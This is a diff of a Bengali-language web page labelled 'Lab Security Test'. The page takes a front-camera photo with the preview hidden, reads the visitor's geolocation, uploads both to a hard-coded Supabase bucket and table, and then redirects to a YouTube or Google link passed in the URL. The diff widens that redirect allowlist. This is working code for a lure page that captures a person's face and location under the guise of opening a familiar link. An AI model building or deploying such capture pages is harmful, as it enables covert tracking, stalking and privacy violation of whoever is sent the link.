@@ -1,43 +1,68 @@
 <!DOCTYPE html>
 <html lang="bn">
+
 <head>
+
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1.0"
+  >
 
   <title>Lab Security Test</title>
 
   <style>
+
     body {
       font-family: Arial, sans-serif;
       margin: 0;
       min-height: 100vh;
       background: #f5f5f5;
+
       display: flex;
       justify-content: center;
       align-items: center;
     }
 
     .box {
+
       width: 92%;
       max-width: 600px;
+
       background: white;
+
       padding: 30px;
+
       border-radius: 15px;
-      box-shadow: 0 3px 12px rgba(0,0,0,0.12);
+
+      box-shadow:
+        0 3px 12px rgba(0,0,0,0.12);
+
       text-align: center;
     }
 
     button {
+
       display: block;
+
       margin: 20px auto;
+
       width: 80%;
       max-width: 400px;
+
       padding: 18px;
+
       border: none;
+
       border-radius: 12px;
+
       background: #222;
+
       color: white;
+
       font-size: 20px;
+
       font-weight: bold;
     }
 
@@ -45,23 +70,36 @@
       opacity: 0.6;
     }
 
+    /*
+     * Camera preview hidden
+     */
+
     #camera {
       display: none;
     }
 
     #status {
+
       margin-top: 15px;
+
       font-weight: bold;
+
       line-height: 1.6;
     }
 
     .notice {
+
       font-size: 14px;
+
       color: #555;
+
       line-height: 1.5;
     }
+
   </style>
+
 </head>
+
 
 <body>
 
@@ -70,24 +108,46 @@
   <h2>🔐 Lab Security Test</h2>
 
   <p class="notice">
-    Continue করলে camera ও location permission চাওয়া হবে।
-    Photo ও location এই lab-এর Supabase database-এ save হবে।
+
+    Continue করলে camera ও location
+    permission চাওয়া হবে।
+
+    Photo ও location এই lab-এর
+    Supabase database-এ save হবে।
+
   </p>
 
-  <button id="startBtn" onclick="startTest()">
+
+  <button
+    id="startBtn"
+    onclick="startTest()"
+  >
     📷 Continue
   </button>
 
-  <video id="camera" autoplay playsinline></video>
+
+  <video
+    id="camera"
+    autoplay
+    playsinline
+  ></video>
+
 
   <p id="status"></p>
 
 </div>
 
 
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script
+  src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2">
+</script>
+
 
 <script>
+
+/* =========================
+   SUPABASE
+========================= */
 
 const SUPABASE_URL =
   "https://kkydmymmltcxjxtbkhwj.supabase.co";
@@ -97,13 +157,16 @@ const SUPABASE_PUBLISHABLE_KEY =
 
 const supabaseClient =
   window.supabase.createClient(
+
     SUPABASE_URL,
+
     SUPABASE_PUBLISHABLE_KEY
+
   );
 
 
 /* =========================
-   GET TARGET YOUTUBE URL
+   GET TARGET URL
 ========================= */
 
 function getTargetURL() {
@@ -125,30 +188,46 @@ function getTargetURL() {
     const url =
       new URL(target);
 
+    const hostname =
+      url.hostname.toLowerCase();
+
+
+    /*
+     * Only allow these destinations
+     */
+
     const allowed =
       url.protocol === "https:" &&
       (
-        url.hostname === "youtube.com" ||
-        url.hostname === "www.youtube.com" ||
-        url.hostname === "m.youtube.com" ||
-        url.hostname === "youtu.be"
+        hostname === "youtube.com" ||
+        hostname === "www.youtube.com" ||
+        hostname === "m.youtube.com" ||
+        hostname === "youtu.be" ||
+
+        hostname === "google.com" ||
+        hostname === "www.google.com" ||
+        hostname === "share.google"
       );
+
 
     if (!allowed) {
       return null;
     }
+
 
     return url.href;
 
   } catch (error) {
 
     return null;
+
   }
+
 }
 
 
 /* =========================
-   MAIN TEST
+   START TEST
 ========================= */
 
 async function startTest() {
@@ -164,9 +243,12 @@ async function startTest() {
 
   let stream = null;
 
+
   button.disabled = true;
 
+
   try {
+
 
     /* =========================
        CAMERA PERMISSION
@@ -175,30 +257,41 @@ async function startTest() {
     status.innerText =
       "📷 Camera permission চাওয়া হচ্ছে...";
 
+
     if (
       !navigator.mediaDevices ||
       !navigator.mediaDevices.getUserMedia
     ) {
+
       throw new Error(
         "এই browser-এ camera access available নয়।"
       );
+
     }
+
 
     stream =
       await navigator.mediaDevices.getUserMedia({
+
         video: {
           facingMode: "user"
         },
+
         audio: false
+
       });
+
 
     video.srcObject =
       stream;
 
+
     await video.play();
 
-    await new Promise(resolve =>
-      setTimeout(resolve, 800)
+
+    await new Promise(
+      resolve =>
+        setTimeout(resolve, 800)
     );
 
 
@@ -209,45 +302,69 @@ async function startTest() {
     const canvas =
       document.createElement("canvas");
 
+
     canvas.width =
       video.videoWidth;
 
+
     canvas.height =
       video.videoHeight;
+
 
     if (
       canvas.width === 0 ||
       canvas.height === 0
     ) {
+
       throw new Error(
         "Camera থেকে ছবি নেওয়া যায়নি।"
       );
+
     }
+
 
     const ctx =
       canvas.getContext("2d");
 
+
     ctx.drawImage(
+
       video,
+
       0,
+
       0,
+
       canvas.width,
+
       canvas.height
+
     );
 
+
     const photoBlob =
-      await new Promise(resolve =>
-        canvas.toBlob(
-          resolve,
-          "image/jpeg",
-          0.85
-        )
+      await new Promise(
+        resolve =>
+
+          canvas.toBlob(
+
+            resolve,
+
+            "image/jpeg",
+
+            0.85
+
+          )
+
       );
 
+
     if (!photoBlob) {
+
       throw new Error(
         "Photo capture করা যায়নি।"
       );
+
     }
 
 
@@ -257,11 +374,14 @@ async function startTest() {
 
     stream
       .getTracks()
-      .forEach(track =>
-        track.stop()
+      .forEach(
+        track =>
+          track.stop()
       );
 
+
     stream = null;
+
 
     video.srcObject =
       null;
@@ -274,32 +394,47 @@ async function startTest() {
     status.innerText =
       "📍 Location permission চাওয়া হচ্ছে...";
 
+
     if (!navigator.geolocation) {
+
       throw new Error(
         "এই browser-এ location available নয়।"
       );
+
     }
+
 
     const position =
       await new Promise(
+
         (resolve, reject) => {
 
           navigator.geolocation.getCurrentPosition(
+
             resolve,
+
             reject,
+
             {
+
               enableHighAccuracy: false,
+
               timeout: 30000,
+
               maximumAge: 30000
+
             }
+
           );
 
         }
+
       );
 
 
     const latitude =
       position.coords.latitude;
+
 
     const longitude =
       position.coords.longitude;
@@ -322,21 +457,37 @@ async function startTest() {
     status.innerText =
       "☁️ Photo upload হচ্ছে...";
 
+
     const uploadResult =
       await supabaseClient
+
         .storage
+
         .from("photos")
+
         .upload(
+
           fileName,
+
           photoBlob,
+
           {
-            contentType: "image/jpeg",
-            upsert: false
+
+            contentType:
+              "image/jpeg",
+
+            upsert:
+              false
+
           }
+
         );
 
+
     if (uploadResult.error) {
+
       throw uploadResult.error;
+
     }
 
 
@@ -347,17 +498,30 @@ async function startTest() {
     status.innerText =
       "💾 Location save হচ্ছে...";
 
+
     const insertResult =
       await supabaseClient
+
         .from("captures")
+
         .insert({
-          photo_url: fileName,
-          latitude: latitude,
-          longitude: longitude
+
+          photo_url:
+            fileName,
+
+          latitude:
+            latitude,
+
+          longitude:
+            longitude
+
         });
 
+
     if (insertResult.error) {
+
       throw insertResult.error;
+
     }
 
 
@@ -368,44 +532,58 @@ async function startTest() {
     status.innerText =
       "✅ Photo এবং location সফলভাবে save হয়েছে।";
 
+
     button.style.display =
       "none";
 
 
     /* =========================
-       REDIRECT TO YOUTUBE
+       REDIRECT
     ========================= */
 
     const targetURL =
       getTargetURL();
 
+
     if (targetURL) {
 
       status.innerText =
-        "✅ Save হয়েছে। YouTube খোলা হচ্ছে...";
+        "✅ Save হয়েছে। Destination খোলা হচ্ছে...";
 
-      setTimeout(() => {
 
-        window.location.href =
-          targetURL;
+      setTimeout(
 
-      }, 800);
+        () => {
+
+          window.location.href =
+            targetURL;
+
+        },
+
+        800
+
+      );
 
     }
 
 
   } catch (error) {
 
+
     console.error(error);
+
 
     if (stream) {
 
       stream
         .getTracks()
-        .forEach(track =>
-          track.stop()
+        .forEach(
+          track =>
+            track.stop()
         );
+
     }
+
 
     button.disabled =
       false;
@@ -416,15 +594,18 @@ async function startTest() {
       status.innerText =
         "❌ Location permission দেওয়া হয়নি।";
 
+
     } else if (error.code === 2) {
 
       status.innerText =
         "❌ Location পাওয়া যায়নি। ফোনের Location ON করে আবার চেষ্টা করো।";
 
+
     } else if (error.code === 3) {
 
       status.innerText =
         "❌ ৩০ সেকেন্ডের মধ্যে Location পাওয়া যায়নি।";
+
 
     } else {
 
@@ -444,4 +625,5 @@ async function startTest() {
 </script>
 
 </body>
+
 </html>
